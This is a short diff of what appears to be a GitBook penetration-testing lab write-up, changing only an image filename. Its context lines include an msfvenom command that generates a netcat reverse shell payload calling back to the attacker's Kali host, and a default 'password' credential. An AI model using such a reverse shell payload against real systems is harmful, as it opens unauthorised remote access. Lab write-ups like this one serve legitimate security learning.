@@ -133,7 +133,7 @@ Password: password
 msfvenom -p cmd/unix/reverse_netcat lhost=$KALI lport=8888 R
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (2) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
